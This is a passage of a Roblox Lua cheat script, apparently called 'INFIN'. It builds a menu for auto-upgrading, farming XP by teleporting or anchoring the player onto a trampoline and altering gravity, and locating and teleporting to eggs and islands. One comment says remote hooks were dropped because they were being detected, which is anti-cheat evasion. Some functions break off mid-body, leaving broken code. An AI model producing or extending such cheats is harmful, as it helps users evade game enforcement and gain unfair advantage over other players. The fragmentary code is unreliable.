    local ti = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    for k, nb in pairs(W.navBtns) do
        local on = (k == navKey)
        TweenService:Create(nb.btn, ti, { BackgroundTransparency = on and 0 or 1 }):Play()
        nb.ibox.BackgroundColor3 = on and C.white or C.card
        nb.igrad.Enabled = on
        nb.istroke.Transparency = on and 1 or 0.3
        nb.icon.TextColor3 = on and C.white or C.muted
        nb.name.TextColor3 = on and C.white or C.muted
        if on and S.lastNav ~= k then U.popIn(nb.ibox) end
    end
    S.lastNav = navKey

    -- slide direction: sub-tabs slide left/right, other pages rise in
    local dirX = 0
    if fromKey and W.pages[fromKey] and W.pages[fromKey].group == page.group then
        dirX = (page.sliderIndex or 1) > (W.pages[fromKey].sliderIndex or 1) and 30 or -30
        -- sub-tab slider glides from the old spot
        if page.slider then
            local n = page.groupSize
            page.slider.Position = UDim2.new(((W.pages[fromKey].sliderIndex or 1) - 1) / n, 3, 0, 3)
            TweenService:Create(page.slider, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                { Position = UDim2.new((page.sliderIndex - 1) / n, 3, 0, 3) }):Play()
        end
    end

    for k, p in pairs(W.pages) do
        if k == key then
            p.frame.Visible = true
            p.frame.CanvasPosition = Vector2.new(0, 0)
            p.frame.Position = UDim2.fromOffset(dirX, dirX == 0 and 14 or 0)
            TweenService:Create(p.frame, TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                { Position = UDim2.fromOffset(0, 0) }):Play()
        else
            p.frame.Visible = false
        end
    end

    local title = page.group and (page.group:sub(1, 1):upper() .. page.group:sub(2)) or page.title
    W.pageTitle.Text = title
    W.pageSub.Text = page.sub
    W.pageTitle.Position = UDim2.fromOffset(96, 10)
    TweenService:Create(W.pageTitle, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        { Position = UDim2.fromOffset(88, 10) }):Play()
end

-- ---------- toasts (bottom-right of the screen) ----------
do
    W.toasts = U.new("Frame", {
        AnchorPoint = Vector2.new(1, 1), Position = UDim2.new(1, -16, 1, -16),
        Size = UDim2.fromOffset(250, 260), BackgroundTransparency = 1, Parent = W.gui,
    })
    local l = U.vlist(W.toasts, 6)
    l.VerticalAlignment = Enum.VerticalAlignment.Bottom
    l.HorizontalAlignment = Enum.HorizontalAlignment.Right
    W.toastScale = U.new("UIScale", { Parent = W.toasts })
end

S.toastN = 0
function A.toast(text, color)
    if S.toasts == false then return end
    S.toastN += 1
    local slot = U.new("Frame", {
        Size = UDim2.fromOffset(250, 44), BackgroundTransparency = 1, LayoutOrder = S.toastN, Parent = W.toasts,
    })
    local t = U.new("Frame", {
        Size = UDim2.fromScale(1, 1), Position = UDim2.fromOffset(270, 0),
        BackgroundColor3 = C.bg1, BorderSizePixel = 0, Parent = slot,
    })
    U.corner(t, 11)
    U.stroke(t, color or C.violet, 1, 0.35)
    local bar = U.new("Frame", {
        Size = UDim2.new(0, 3, 1, -16), Position = UDim2.fromOffset(8, 8),
        BackgroundColor3 = color or C.violet, BorderSizePixel = 0, Parent = t,
    })
    U.round(bar)
    local img = U.new("ImageLabel", {
        Size = UDim2.fromOffset(24, 24), Position = UDim2.fromOffset(18, 10),
        BackgroundTransparency = 1, Image = LOGO_ID, ScaleType = Enum.ScaleType.Crop, Parent = t,
    })
    U.round(img)
    U.label(t, {
        Text = "INFIN", Font = F.bold, TextSize = 9, TextColor3 = C.accent,
        Position = UDim2.fromOffset(50, 7), Size = UDim2.new(1, -60, 0, 11),
    })
    U.label(t, {
        Text = text, Font = F.bold, TextSize = 12, TextTruncate = Enum.TextTruncate.AtEnd,
        Position = UDim2.fromOffset(50, 20), Size = UDim2.new(1, -60, 0, 16),
    })
    TweenService:Create(t, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        { Position = UDim2.fromOffset(0, 0) }):Play()
    task.delay(2.8, function()
        local out = TweenService:Create(t, TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            { Position = UDim2.fromOffset(270, 0) })
        out.Completed:Connect(function() slot:Destroy() end)
        out:Play()
    end)
end

-- ---------- floating open button ----------
do
    local fb = U.new("TextButton", {
        Text = "", AutoButtonColor = false, Size = UDim2.fromOffset(44, 44),
        AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 14, 0.5, 0),
        BackgroundColor3 = C.bg1, BorderSizePixel = 0, Parent = W.gui,
    })
    U.round(fb)
    local st = U.stroke(fb, C.white, 2, 0)
    U.grad(st, C.violet, C.blue, 45)
    local img = U.new("ImageLabel", {
        Size = UDim2.new(1, -8, 1, -8), Position = UDim2.fromOffset(4, 4), BackgroundTransparency = 1,
        Image = LOGO_ID, ScaleType = Enum.ScaleType.Crop, Parent = fb,
    })
    U.round(img)
    W.floatDot = U.new("Frame", {
        Size = UDim2.fromOffset(12, 12), AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, 0, 0, 0),
        BackgroundColor3 = C.red, BorderSizePixel = 0, Parent = fb,
    })
    U.round(W.floatDot)
    U.stroke(W.floatDot, C.bg1, 2, 0)
    W.floatScale = U.new("UIScale", { Parent = fb })
    W.float = fb
end

-- ---------- fit / open / close ----------
function A.isMobile()
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

function A.fitScale()
    local vp = camera.ViewportSize
    local hf = A.isMobile() and 0.7 or 0.82
    local base = math.min(vp.X * 0.9 / WIN_W, vp.Y * hf / WIN_H)
    return math.clamp(base * S.uiSize, 0.45, A.isMobile() and 1 or 1.3)
end

function A.applyFit()
    local f = A.fitScale()
    if S.winOpen then W.fit.Scale = f end
    local small = math.clamp(f, 0.6, 1)
    W.toastScale.Scale = small
    W.floatScale.Scale = small
end

function A.setWindow(open)
    S.winOpen = open
    local f = A.fitScale()
    if open then
        W.win.Visible = true
        W.fit.Scale = f * 0.9
        TweenService:Create(W.fit, TweenInfo.new(0.26, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
            { Scale = f }):Play()
    else
        local tw = TweenService:Create(W.fit, TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            { Scale = f * 0.9 })
        tw.Completed:Connect(function()
            if not S.winOpen then W.win.Visible = false end
        end)
        tw:Play()
    end
end

camera:GetPropertyChangedSignal("ViewportSize"):Connect(A.applyFit)
A.applyFit()

W.minBtn.MouseButton1Click:Connect(function() A.setWindow(false) end)

U.drag(W.win, W.top, function(x, y)
    local vp = camera.ViewportSize
    return math.clamp(x, -vp.X / 2 + 60, vp.X / 2 - 60), math.clamp(y, -vp.Y / 2 + 30, vp.Y / 2 - 30)
end)
U.drag(W.float, W.float, function(x, y)
    local vp = camera.ViewportSize
    return math.clamp(x, 0, vp.X - 44), math.clamp(y, -vp.Y / 2 + 30, vp.Y / 2 - 30)
end, function()
    A.setWindow(not S.winOpen)
end)

UserInputService.InputBegan:Connect(function(input, processed)
    if processed or input.KeyCode ~= S.toggleKey then return end
    A.setWindow(not S.winOpen)
end)

-- ============================================================
-- PAGES (blank for now)
-- ============================================================
local P = {}
P.farm     = A.page("farm",     "Home",     "farm + your level",     "⌂", 1)
P.stats    = A.page("stats",    "Stats",    "xp rate + next level",  "◆", 2)
P.eggs     = A.page("eggs",     "Eggs",     "find + fly to eggs",    "◎", 3, "travel")
P.islands  = A.page("islands",  "Islands",  "fly to the main islands", "▲", 3, "travel")
P.config   = A.page("config",   "Game",     "auto xp method + player", "≡", 4, "settings")
P.settings = A.page("settings", "App",      "speed, stats, interface", "⚙", 4, "settings")
A.navGroup("travel",   "Travel",   "eggs + islands",  "➤", 3, { "eggs", "islands" })
A.navGroup("settings", "Settings", "game + app",      "⚙", 4, { "config", "settings" })

-- ============================================================
-- STATUS PILL
-- ============================================================
RunService.RenderStepped:Connect(function()
    if not (S.autoUpgrade or S.autoXP or S.eggHunt) then
        W.pillDot.Size = UDim2.fromOffset(6, 6)
        return
    end
    local s = 6 + math.sin(os.clock() * 5) * 1.5
    W.pillDot.Size = UDim2.fromOffset(s, s)
end)

function A.updatePill()
    local on = S.autoUpgrade or S.autoXP or S.eggHunt
    local col = on and C.green or C.red
    local txt = on and "FARMING" or "IDLE"
    W.pillDot.BackgroundColor3, W.pillEdge.Color, W.pillText.Text = col, on and col or C.line, txt
    W.sideDot.BackgroundColor3, W.sideText.Text = col, txt
    W.floatDot.BackgroundColor3 = col
end

-- ============================================================
-- AUTO FARM PAGE
-- ============================================================
do
    local sec = U.section(P.farm, "AUTOMATIC", 1)
    _, W.setUpgrade = U.onOff(U.row(sec, "AUTO UPGRADE", "upgrades once the XP bar hits 100%"), false, function(on)
        S.autoUpgrade = on
        A.updatePill()
        A.toast(on and "Auto upgrade on" or "Auto upgrade off", on and C.green or C.dim)
    end)
    _, W.setXP = U.onOff(U.row(sec, "AUTO XP", "bounces on your trampoline · method in Config"), false, function(on)
        S.autoXP = on
        A.updatePill()
        A.toast(on and "Auto XP on" or "Auto XP off", on and C.green or C.dim)
    end)
end

-- ---------- remote loops ----------
A.remotes = {}
function A.netRemote(name)
    local r = A.remotes[name]
    if r and r.Parent then return r end
    local pk = ReplicatedStorage:FindFirstChild("Packages")
    local net = pk and pk:FindFirstChild("Net")
    r = net and net:FindFirstChild(name) or nil
    A.remotes[name] = r
    return r
end

function A.fireLoop(flag, name, delay, label, ...)
    local args = table.pack(...)
    
                    warned = false
                elseif not warned then
                    warned = true
                    A.toast(label .. " remote not found", C.red)
                end
            end
            task.wait(delay)
        end
    end)
end

-- AUTO UPGRADE: fires once each time the XP bar reaches 100%
-- (retries every UPGRADE_RETRY seconds only if the bar is still full)
local UPGRADE_RETRY = 3

                        firedAt, firedFor, warned = os.clock(), key, false
                        if Stats then Stats.upgrades = (Stats.upgrades or 0) + 1 end
                        A.toast("Bar full  ·  upgrading", C.green)
                    elseif not warned then
                        warned = true
                        A.toast("Upgrade remote not found", C.red)
                    end
                end
            else
                firedFor = nil
            end
        end
        task.wait(0.1)
    end
end)
-- ============================================================
-- TRAMPOLINE + JUMP REMOTE DETECTOR
-- best source: the game itself. The moment YOU bounce, the game fires
-- the jump remote with YOUR trampoline's Weld, so we catch both at once.
-- fallback: owned tag > at your base > only one > standing on > nearest
-- ============================================================
local Tramp = { list = {}, set = {}, current = nil, how = "none", rank = 0 }
local Jump  = { remote = nil, weld = nil, hooked = false }
local RANK  = { fired = 6, owned = 4, base = 3, only = 3, standing = 2, nearest = 1 }
local OWNER_KEYS = { "Owner", "OwnerId", "OwnerUserId", "UserId", "Player", "PlayerName", "OwnerName" }

local function ownerMatch(v)
    if v == nil then return false end
    if typeof(v) == "Instance" then return v == player end
    local str = tostring(v)
    return str == tostring(player.UserId) or str == player.Name or str == player.DisplayName
end

function Tramp.ownedBy(inst, depth)
    local cur = inst
    for _ = 1, depth or 5 do
        if not cur or cur == workspace then break end
        for _, k in ipairs(OWNER_KEYS) do
            if ownerMatch(cur:GetAttribute(k)) then return true end
            local v = cur:FindFirstChild(k)
            if v and v:IsA("ValueBase") and ownerMatch(v.Value) then return true end
        end
        if cur.Name:find(player.Name, 1, true) then return true end
        cur = cur.Parent
    end
    return false
end

-- the "Weld" child (any class named Weld first, then real welds)
function Tramp.weld(t)
    if not (t and t.Parent) then return nil end
    return t:FindFirstChild("Weld")
        or t:FindFirstChildWhichIsA("Weld", true)
        or t:FindFirstChildWhichIsA("WeldConstraint", true)
end

function Tramp.pos(t)
    local ok, cf = pcall(function()
        if t:IsA("Model") then return t:GetPivot() end
        if t:IsA("BasePart") then return t.CFrame end
    end)
    if ok and cf then return cf.Position end
    local part = t:FindFirstChildWhichIsA("BasePart", true)
    return part and part.Position
end

function Tramp.topPos(t)
    local ok, cf, size = pcall(function()
        if t:IsA("Model") then return t:GetBoundingBox() end
        if t:IsA("BasePart") then return t.CFrame, t.Size end
    end)
    if ok and cf and size then return cf.Position + Vector3.new(0, size.Y / 2 + 4, 0) end
    local p = Tramp.pos(t)
    return p and p + Vector3.new(0, 6, 0)
end

function Tramp.folder()
    local map = workspace:FindFirstChild("Map")
    return (map and map:FindFirstChild("BaseTrampolines")) or workspace:FindFirstChild("BaseTrampolines", true)
end

-- which trampoline an instance belongs to
function Tramp.owner(inst)
    local folder = Tramp.folder()
    local a = inst
    while a and a ~= workspace do
        if Tramp.set[a] then return a end
        if folder and a.Parent == folder then return a end
        if a.Name:lower():find("trampoline", 1, true) and a.Parent and
        not a.Parent.Name:lower():find("trampoline", 1, true) then return a end
        a = a.Parent
    end
    return nil
end

function Tramp.collect()
    local list, set = {}, {}
    local folder = Tramp.folder()
    if folder then
        -- every child of BaseTrampolines, whatever class / name it has
        for _, c in ipairs(folder:GetChildren()) do
            if Tramp.weld(c) then set[c] = true table.insert(list, c) end
        end
    end
    if #list == 0 then
        for _, d in ipairs(workspace:GetDescendants()) do
            if d.Name:lower():find("trampoline", 1, true) and not d:IsA("ValueBase")
            and not set[d] and Tramp.weld(d) then
                local inside, a = false, d.Parent
                while a and a ~= workspace do
                    if set[a] then inside = true break end
                    a = a.Parent
                end
                if not inside then set[d] = true table.insert(list, d) end
            end
        end
    end
    Tramp.list, Tramp.set = list, set
    return list
end

-- locks onto ONE trampoline; it only changes if that one is removed / replaced
function Tramp.pick(t, how)
    local changed = Tramp.current ~= t
    Tramp.current, Tramp.how, Tramp.rank = t, how, RANK[how] or 0
    if t then Tramp.lastPos = Tramp.pos(t) or Tramp.lastPos end
    if changed and t then A.toast("Trampoline locked: " .. t.Name, C.violet) end
end

function Tramp.locked()
    local cur = Tramp.current
    return cur ~= nil and cur.Parent ~= nil and Tramp.weld(cur) ~= nil
end

function Tramp.basePos()
    for _, name in ipairs({ "Plots", "Bases", "Tycoons", "PlayerBases" }) do
        local f = workspace:FindFirstChild(name, true)
        if f then
            for _, b in ipairs(f:GetChildren()) do
                if Tramp.ownedBy(b, 1) then return Tramp.pos(b) end
            end
        end
    end
    local spawnLoc = player.RespawnLocation
    return spawnLoc and spawnLoc.Position or nil
end

function Tramp.detect()
    if Tramp.locked() then return end   -- already have our one trampoline

    -- what the game itself used always wins
    if Jump.weld and Jump.weld.Parent then
        local t = Tramp.owner(Jump.weld)
        if t then return Tramp.pick(t, "fired") end
    end

    local list = Tramp.collect()
    if #list == 0 then
        Tramp.current, Tramp.how, Tramp.rank = nil, "none", 0
        return
    end

    -- ours got replaced (upgrade): take the new one standing on the same spot
    if Tramp.lastPos then
        local best, bd
        for _, t in ipairs(list) do
            local p = Tramp.pos(t)
            local d = p and (p - Tramp.lastPos).Magnitude
            if d and d < 25 and (not bd or d < bd) then best, bd = t, d end
        end
        if best then return Tramp.pick(best, Tramp.how ~= "none" and Tramp.how or "base") end
    end

    for _, t in ipairs(list) do
        if Tramp.ownedBy(t) then return Tramp.pick(t, "owned") end
    end

    local bp = Tramp.basePos()
    if bp then
        local best, bd
        for _, t in ipairs(list) do
            local p = Tramp.pos(t)
            local d = p and (p - bp).Magnitude
            if d and d < 250 and (not bd or d < bd) then best, bd = t, d end
        end
        if best then return Tramp.pick(best, "base") end
    end

    if #list == 1 then return Tramp.pick(list[1], "only") end

    local ch = player.Character
    local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
    local best, bd
    for _, t in ipairs(list) do
        local p = Tramp.pos(t)
        local d = (p and hrp) and (p - hrp.Position).Magnitude or math.huge
        if not bd or d < bd then best, bd = t, d end
    end
    Tramp.pick(best, "nearest")
end

-- (no FireServer / __namecall hooks: those were getting detected on load)

-- only re-detect when the locked trampoline disappears (e.g. swapped by an upgrade)

-- ============================================================
-- AUTO XP  (no remotes: physical bounces on your own trampoline)
-- ============================================================
-- real top surface of the trampoline (ray onto it, bounding box as fallback)
function Tramp.surface(t)
    if not (t and t.Parent) then return nil end
    local ok, cf, size = pcall(function()
        if t:IsA("Model") then return t:GetBoundingBox() end
        return t.CFrame, t.Size
    end)
    if not ok or not cf then return nil end
    local rp = RaycastParams.new()
    rp.FilterType = Enum.RaycastFilterType.Include
    rp.FilterDescendantsInstances = { t }
    local hit = workspace:Raycast(cf.Position + Vector3.new(0, size.Y + 20, 0), Vector3.new(0, -(size.Y * 2 + 40), 0), rp)
    if hit then return hit.Position end
    return cf.Position + Vector3.new(0, size.Y / 2, 0)
end

local XPM = { anchored = nil, savedGravity = nil, wiggle = false }

function XPM.release()
    if XPM.anchored and XPM.anchored.Parent then XPM.anchored.Anchored = false end
    XPM.anchored = nil
    if XPM.savedGravity then
        workspace.Gravity = XPM.savedGravity
        XPM.savedGravity = nil
    end
end

function XPM.tick(hrp, hum, t)
    local surf = Tramp.surface(t)
    if not surf then return false end
    local rot = hrp.CFrame - hrp.Position
    local stand = hum.HipHeight + hrp.Size.Y / 2

    if S.xpMethod == "WEDGE" then
        -- wedged / anchored inside the trampoline
        if XPM.savedGravity then workspace.Gravity = XPM.savedGravity XPM.savedGravity = nil end
        XPM.wiggle = not XPM.wiggle
        local off = (S.wedgeWiggle and XPM.wiggle) and 0.6 or 0
        hrp.Anchored = true
        XPM.anchored = hrp
        hrp.CFrame = CFrame.new(surf + Vector3.new(0, stand - S.wedgeDepth + off, 0)) * rot
    else
        -- TP: drop onto it again and again
        if XPM.anchored then XPM.anchored.Anchored = false XPM.anchored = nil end
        if S.tpGravity then
            XPM.savedGravity = XPM.savedGravity or workspace.Gravity
            if workspace.Gravity ~= 1000 then workspace.Gravity = 1000 end
        elseif XPM.savedGravity then
            workspace.Gravity = XPM.savedGravity
            XPM.savedGravity = nil
        end
        hrp.CFrame = CFrame.new(surf + Vector3.new(0, stand + S.tpHeight, 0)) * rot
        hrp.AssemblyLinearVelocity = Vector3.new(0, -120, 0)
    end
    S.bounces += 1
    return true
end

-- ============================================================
-- EGGS PAGE
-- finds every egg in the map whose name is longer than 7 characters,
-- shows a live 3D preview, a red seconds-left timer and a TP button
-- ============================================================
local Egg = { rows = {}, MIN_LEN = 7, MAX_ROWS = 40 }

local TIME_LEFT_KEYS = { "TimeLeft", "TimeRemaining", "Remaining", "SecondsLeft", "Timer", "Countdown", "Time" }
local TIME_END_KEYS  = { "EndTime", "EndsAt", "ExpiresAt", "ExpireTime", "DespawnAt", "DespawnTime", "HatchAt", "ReadyAt" }

function Egg.isEgg(m)
    return m:IsA("Model") and #m.Name > Egg.MIN_LEN and m.Name:lower():find("egg", 1, true) ~= nil
end

function Egg.find()
    local out, seen = {}, {}
    local ch = player.Character
    for _, d in ipairs(workspace:GetDescendants()) do
        if Egg.isEgg(d) and not (ch and d:IsDescendantOf(ch)) then
            local inside, a = false, d.Parent
            while a and a ~= workspace do
                if seen[a] then inside = true break end
                a = a.Parent
            end
            if not inside then
                seen[d] = true
                table.insert(out, d)
            end
        end
    end
    return out
end

function Egg.pos(m)
    local ok, cf = pcall(m.GetPivot, m)
    return ok and cf.Position or nil
end

-- seconds left: attributes, value objects, then the egg's own timer text
local function endToLeft(v)
    v = tonumber(v)
    if not v then return nil end
    if v > 1e12 then v = v / 1000 end
    if v > 1e9 then return v - workspace:GetServerTimeNow() end
    return nil
end

local function parseTimerText(t)
    t = t:gsub("<[^>]->", ""):lower()
    local h, m, sec = t:match("(%d+):(%d+):(%d+)")
    if h then return h * 3600 + m * 60 + sec end
    m, sec = t:match("(%d+):(%d+)")
    if m then return m * 60 + sec end
    m, sec = t:match("(%d+)%s*m%s*(%d+)%s*s")
    if m then return m * 60 + sec end
    m = t:match("(%d+)%s*m%a*$") or t:match("(%d+)%s*min")
    if m then return m * 60 end
    sec = t:match("(%d+%.?%d*)%s*s")
    return sec and tonumber(sec) or nil
end

function Egg.timeLeft(m)
    for _, inst in ipairs({ m, m.PrimaryPart }) do
        if inst then
            for _, k in ipairs(TIME_LEFT_KEYS) do
                local v = tonumber(inst:GetAttribute(k))
                if v then return v end
            end
            for _, k in ipairs(TIME_END_KEYS) do
                local v = endToLeft(inst:GetAttribute(k))
                if v then return v end
            end
        end
    end
    for _, c in ipairs(m:GetDescendants()) do
        if c:IsA("NumberValue") or c:IsA("IntValue") then
            for _, k in ipairs(TIME_LEFT_KEYS) do
                if c.Name == k then return c.Value end
            end
            for _, k in ipairs(TIME_END_KEYS) do
                if c.Name == k then
                    local v = endToLeft(c.Value)
                    if v then return v end
                end
            end
        elseif c:IsA("TextLabel") then
            local t = (c.ContentText ~= "" and c.ContentText) or c.Text
            if t and t:find("%d") and (t:find(":") or t:lower():find("%d%s*[sm]")) then
                local v = parseTimerText(t)
                if v then return v end
            end
        end
    end
    return nil
end

function Egg.fmt(sec)
    sec = math.max(0, math.floor(sec + 0.5))
    if sec >= 3600 then return ("%dh %dm left"):format(sec // 3600, (sec % 3600) // 60) end
    if sec >= 60 then return ("%dm %ds left"):format(sec // 60, sec % 60) end
    return sec .. "s left"
end

-- ---------- live preview ----------
-- 1) the game's own viewport api if it has one   2) a live clone of the egg itself
function Egg.api()
    if Egg._api ~= nil then return Egg._api or nil end
    Egg._api = false
    for _, d in ipairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
        if d:IsA("ModuleScript") and d.Name:lower():find("egg", 1, true) then
            local ok, mod = pcall(require, d)
            if ok and type(mod) == "table" and (rawget(mod, "AttachOnViewport")
            or rawget(mod, "AttachOnViewportWithOptimizations")) then
                Egg._api = mod
                break
            end
        end
    end
    return Egg._api or nil
end

local function viewportModel(vpf)
    for _, c in ipairs(vpf:GetChildren()) do
        if c:IsA("Model") then return c end
        if c:IsA("WorldModel") then
            local m = c:FindFirstChildWhichIsA("Model")
            if m then return m end
        end
    end
    return nil
end

local function cloneInto(vpf, src)
    local oldArch = src.Archivable
    pcall(function() src.Archivable = true end)
    local ok, clone = pcall(src.Clone, src)
    pcall(function() src.Archivable = oldArch end)
    if not ok or not clone then return nil end
    for _, d in ipairs(clone:GetDescendants()) do
        if d:IsA("BaseScript") or d:IsA("Sound") or d:IsA("BillboardGui") or d:IsA("SurfaceGui")
        or d:IsA("ParticleEmitter") or d:IsA("ProximityPrompt") or d:IsA("Beam") or d:IsA("Trail") then
            d:Destroy()
        elseif d:IsA("BasePart") then
            d.Anchored = true
        end
    end
    clone.Parent = vpf
    return clone
end

Egg.spinners = {}
function Egg.render(vpf, cam, src)
    local model
    local api = Egg.api()
    if api then
        pcall(function()
            if api.AttachOnViewportWithOptimizations then
                api:AttachOnViewportWithOptimizations(src.Name, vpf)
            else
                api:AttachOnViewport(src.Name, vpf)
            end
        end)
        model = viewportModel(vpf)
    end
    model = model or cloneInto(vpf, src)
    if not model then return false end

    local ok, cf, size = pcall(model.GetBoundingBox, model)
    if not ok or size.Magnitude < 0.01 then return false end
    local center = cf.Position
    local dist = (size.Magnitude / 2) / math.tan(math.rad(cam.FieldOfView / 2)) * 1.05
    Egg.spinners[vpf] = { cam = cam, center = center, dist = dist, angle = math.random() * 6.28 }
    return true
end

RunService.RenderStepped:Connect(function(dt)
    if S.page ~= "eggs" or not S.winOpen then return end
    for vpf, sp in pairs(Egg.spinners) do
        if not vpf.Parent then
            Egg.spinners[vpf] = nil
        else
            sp.angle += dt * 0.7
            local dir = (CFrame.Angles(0, sp.angle, 0) * Vector3.new(1, 0.4, 1)).Unit
            sp.cam.CFrame = CFrame.lookAt(sp.center + dir * sp.dist, sp.center)
        end
    end
end)

-- ---------- rows ----------
local eggSec = U.section(P.eggs, "CURRENT EGGS", 1)
local eggCount = U.label(eggSec, {
    Text = "scanning...", Font = F.med, TextSize = 10, TextColor3 = C.dim,
    Size = UDim2.new(1, 0, 0, 14), LayoutOrder = 1,
})

function Egg.tp(m)
    if A.travelToEgg then task.spawn(A.travelToEgg, m) end
end

function Egg.makeRow(m)
    local r = U.new("Frame", {
        Size = UDim2.new(1, 0, 0, 64), BackgroundColor3 = C.card, BackgroundTransparency = 0.12,
        BorderSizePixel = 0, Parent = eggSec,
    })
    U.corner(r, 11)
    U.stroke(r, C.line, 1, 0.55)
    U.grad(r, C.white, Color3.fromRGB(190, 184, 214), 90)
    U.popIn(r)

    local box = U.new("Frame", {
        Size = UDim2.fromOffset(52, 52), Position = UDim2.fromOffset(6, 6),
        BackgroundColor3 = C.field, BorderSizePixel = 0, ClipsDescendants = true, Parent = r,
    })
    U.corner(box, 9)
    U.stroke(box, C.violet, 1, 0.6)
    local vpf = U.new("ViewportFrame", {
        Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
        Ambient = Color3.fromRGB(200, 190, 220), LightColor = C.white,
        LightDirection = Vector3.new(-0.4, -1, -0.6), Parent = box,
    })
    local cam = U.new("Camera", { FieldOfView = 40, Parent = vpf })
    vpf.CurrentCamera = cam
    local loading = U.label(box, {
        Text = "...", Font = F.bold, TextSize = 12, TextColor3 = C.dim,
        TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1),
    })
    

    U.label(r, {
        Text = m.Name, Font = F.bold, TextSize = 12, TextTruncate = Enum.TextTruncate.AtEnd,
        Position = UDim2.fromOffset(66, 9), Size = UDim2.new(1, -130, 0, 16),
    })
    local timeLbl = U.label(r, {
        Text = "", Font = F.bold, TextSize = 11, TextColor3 = C.red,
        Position = UDim2.fromOffset(66, 26), Size = UDim2.new(1, -130, 0, 14),
    })
    local distLbl = U.label(r, {
        Text = "", Font = F.med, TextSize = 10, TextColor3 = C.dim,
        Position = UDim2.fromOffset(66, 42), Size = UDim2.new(1, -130, 0, 12),
    })
    local tp = U.pillBtn(r, "TP", -12, 48, true)
    tp.MouseButton1Click:Connect(function() Egg.tp(m) end)

    return { frame = r, time = timeLbl, dist = distLbl }
end

function Egg.refresh()
    local eggs = Egg.find()
    local ch = player.Character
    local hrp = ch and ch:FindFirstChild("HumanoidRootPart")

    local list = {}
    for _, m in ipairs(eggs) do
        local p = Egg.pos(m)
        table.insert(list, { m = m, d = (p and hrp) and (p - hrp.Position).Magnitude or math.huge })
    end
    -- filters + sort (Eggs tab controls)
    local q = (S.eggSearch or ""):lower()
    local filtered = {}
    for _, e in ipairs(list) do
        e.left = Egg.timeLeft(e.m)
        if (q == "" or e.m.Name:lower():find(q, 1, true)) and (not S.eggTimersOnly or e.left) then
            table.insert(filtered, e)
        end
    end
    list = filtered
    local mode = S.eggSort or "NEAR"
    table.sort(list, function(a, b)
        if mode == "TIME" then
            local la, lb = a.left or math.huge, b.left or math.huge
            if la ~= lb then return la < lb end
        elseif mode == "NAME" then
            if a.m.Name ~= b.m.Name then return a.m.Name < b.m.Name end
        end
        return a.d < b.d
    end)
    Egg.sorted = list

    local keep = {}
    for i, e in ipairs(list) do
        if i > Egg.MAX_ROWS then break end
        keep[e.m] = true
        local row = Egg.rows[e.m] or Egg.makeRow(e.m)
        Egg.rows[e.m] = row
        row.frame.LayoutOrder = i + 1
        row.dist.Text = e.d == math.huge and "distance unknown" or (math.floor(e.d) .. " studs away")
        local left = Egg.timeLeft(e.m)
        row.time.Text = left and Egg.fmt(left) or "no timer"
        row.time.TextColor3 = left and C.red or C.dim
    end

    for m, row in pairs(Egg.rows) do
        if not keep[m] then
            row.frame:Destroy()
            Egg.rows[m] = nil
        end
    end

    eggCount.Text = #list == 0 and "no eggs found (name longer than 7 letters with \"egg\" in it)"
        or ("%d egg(s)  ·  %s"):format(#list, ({ NEAR = "nearest first", TIME = "ending soonest", NAME = "a → z" })[S.eggSort or "NEAR"])
end

-- LIVE: new / removed eggs show up instantly, timers + distance tick 4x a second
Egg.dirty = true
workspace.DescendantAdded:Connect(function(d)
    if not Egg.dirty and d:IsA("Model") and Egg.isEgg(d) then Egg.dirty = true end
end)
workspace.DescendantRemoving:Connect(function(d)
    if Egg.rows[d] then Egg.dirty = true end
end)

function Egg.tick()
    local ch = player.Character
    local hrp = ch and ch:FindFirstChild("HumanoidRootPart")
    for m, row in pairs(Egg.rows) do
        if m.Parent then
            local left = Egg.timeLeft(m)
            row.time.Text = left and Egg.fmt(left) or "no timer"
            row.time.TextColor3 = left and C.red or C.dim
            local p = Egg.pos(m)
            if p and hrp then row.dist.Text = math.floor((p - hrp.Position).Magnitude) .. " studs away" end
        end
    end
end

-- ============================================================
-- ISLANDS PAGE
-- detects islands + their real names, TP = land on the center trampoline,
-- gravity 0, then fly there on a route that climbs over obstacles
-- ============================================================
Isle = { rows = {}, busy = false, bounds = {} }
local ISLE_FOLDERS = { "Islands", "Areas", "Worlds", "Zones", "IslandsFolder" }
local ISLE_SPEED = 140        -- studs per second while flying
local ISLE_RESTORE = true     -- put normal gravity back after landing

local MINI_WORDS = { "mini", "small", "tiny", "rock", "float", "decor", "piece", "chunk", "debris", "cloud", "prop" }

-- keeps the big islands, drops the little floating bits
function Isle.mainOnly(list)
    local sized, maxF = {}, 0
    for _, isl in ipairs(list) do
        local _, size = Isle.box(isl)
        local f = size and size.X * size.Z or 0
        local n = isl.Name:lower()
        local mini = false
        for _, w in ipairs(MINI_WORDS) do
            if n:find(w, 1, true) then mini = true break end
        end
        if not mini and f > 0 then
            table.insert(sized, { i = isl, f = f })
            maxF = math.max(maxF, f)
        end
    end
    local out = {}
    for _, e in ipairs(sized) do
        if e.f >= maxF * 0.2 and e.f >= 1500 then table.insert(out, e.i) end
    end
    return (#out > 0) and out or list
end

function Isle.find()
    return Isle.mainOnly(Isle.findAll())
end

function Isle.findAll()
    local out, seen = {}, {}
    local roots = { workspace:FindFirstChild("Map"), workspace }
    for _, root in ipairs(roots) do
        if root then
            for _, n in ipairs(ISLE_FOLDERS) do
                local f = root:FindFirstChild(n)
                if f then
                    for _, c in ipairs(f:GetChildren()) do
                        if not seen[c] and (c:IsA("Model") or c:IsA("BasePart") or c:IsA("Folder")) then
                            seen[c] = true
                            table.insert(out, c)
                        end
                    end
                end
            end
        end
        if #out > 0 then break end
    end
    if #out == 0 then
        local tf = Tramp.folder()
